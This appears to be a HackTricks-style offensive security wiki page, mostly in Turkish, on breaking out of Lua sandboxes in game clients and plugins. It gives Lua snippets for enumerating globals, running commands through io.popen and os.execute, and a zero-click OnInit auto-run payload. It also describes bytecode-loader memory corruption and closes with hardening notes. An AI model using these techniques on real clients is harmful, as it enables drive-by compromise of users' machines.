# Lua sandbox'larını atlatma (gömülü VM'ler, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Bu sayfa, uygulamalara gömülü Lua "sandbox"larını (özellikle game clients, plugins veya uygulama içi scripting motorları) listelemek ve kırmak için pratik teknikleri toplar. Birçok motor kısıtlı bir Lua ortamı açığa çıkarır, ancak güçlü global'leri erişilebilir bırakır; bunlar, bytecode yükleyicileri açığa çıktığında keyfi komut yürütmeye veya hatta native bellek bozulmasına izin verebilir.

Ana fikirler:
- VM'i bilinmeyen bir ortam olarak ele alın: _G'yi enumerate edin ve hangi tehlikeli primitive'lerin erişilebilir olduğunu keşfedin.
- stdout/print engellendiğinde, sonuçları görmek için herhangi bir in-VM UI/IPC kanalını çıktı havuzu olarak kötüye kullanın.
- io/os açığa çıktıysa, genellikle doğrudan komut yürütme imkânı vardır (io.popen, os.execute).
- load/loadstring/loadfile açığa çıktıysa, hazırlanmış Lua bytecode'u çalıştırmak bazı sürümlerde bellek güvenliğini altüst edebilir (≤5.1 doğrulayıcıları atlatılabilir; 5.2 doğrulayıcıyı kaldırdı), bu da ileri düzey exploit'e imkan verir.

## Sandbox'lanmış ortamı keşfetme

- Erişilebilir tabloları/fonksiyonları envantere almak için global ortamı dök:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Eğer print() yoksa, in-VM kanalları yeniden amaçlandırın. Bir MMO housing script VM örneğinde chat çıktısı yalnızca bir sound call'dan sonra çalışıyordu; aşağıdaki güvenilir bir çıktı fonksiyonu oluşturur:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Bu deseni hedefiniz için genelleştirin: string kabul eden herhangi bir textbox, toast, logger veya UI callback keşif için stdout olarak davranabilir.

## io/os açığa çıkmışsa doğrudan komut yürütme

Eğer sandbox hâlâ standart kütüphaneler io veya os'u açığa çıkarıyorsa, muhtemelen anında komut yürütme imkanınız vardır:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notlar:
- Execution client process içinde gerçekleşir; dış debugger'ları engelleyen birçok anti-cheat/antidebug katmanı, in-VM process creation'ı engellemeyecektir.
- Ayrıca kontrol et: package.loadlib (herhangi bir DLL/.so yükleme), require with native modules, LuaJIT's ffi (varsa), ve debug library (VM içinde ayrıcalıkları yükseltebilir).

## Zero-click tetiklemeleri (auto-run callbacks aracılığıyla)

Eğer host application scriptleri clients'a gönderiyorsa ve VM auto-run hooks (ör. OnInit/OnLoad/OnEnter) sağlıyorsa, script yüklenir yüklenmez drive-by compromise için payload'unuzu oraya yerleştirin:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Herhangi bir eşdeğer callback (OnLoad, OnEnter, vb.) scriptler otomatik olarak client üzerinde iletilip çalıştırıldığında bu tekniği genelleştirir.

## Recon sırasında aranacak tehlikeli primitifler

_G enumeration sırasında özellikle şunlara bakın:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: kaynak veya bytecode çalıştırır; güvenilmeyen bytecode yüklemeyi destekler.
- package, package.loadlib, require: dinamik kütüphane yükleme ve modül yüzeyi.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo ve hooks.
- LuaJIT-only: ffi.cdef, ffi.load ile doğrudan native code çağırma.

Erişilebiliyorsa minimal kullanım örnekleri:
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Optional escalation: abusing Lua bytecode loaders

When load/loadstring/loadfile are reachable but io/os are restricted, execution of crafted Lua bytecode can lead to memory disclosure and corruption primitives. Key facts:
- Lua ≤ 5.1 shipped a bytecode verifier that has known bypasses.
- Lua 5.2 removed the verifier entirely (official stance: applications should just reject precompiled chunks), widening the attack surface if bytecode loading is not prohibited.
- Workflows typically: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), then pivot to arbitrary read/write or native code execution.

This path is engine/version-specific and requires RE. See references for deep dives, exploitation primitives, and example gadgetry in games.

## Tespit ve sertleştirme notları (savunucular için)

- Sunucu tarafı: kullanıcı scriptlerini reddet veya yeniden yaz; güvenli API'leri allowlistle; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi öğelerini strip et veya bind-empty yap.
- İstemci tarafı: Lua'yı minimal bir _ENV ile çalıştır, bytecode yüklemeyi yasakla, katı bir bytecode verifier veya imza kontrolleri yeniden getir, ve istemci süreçten process oluşturmayı engelle.
- Telemetry: script yüklemesini takip eden kısa sürede gameclient → child process oluşturulmasında alarm üret; UI/chat/script olaylarıyla korelasyon yap.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
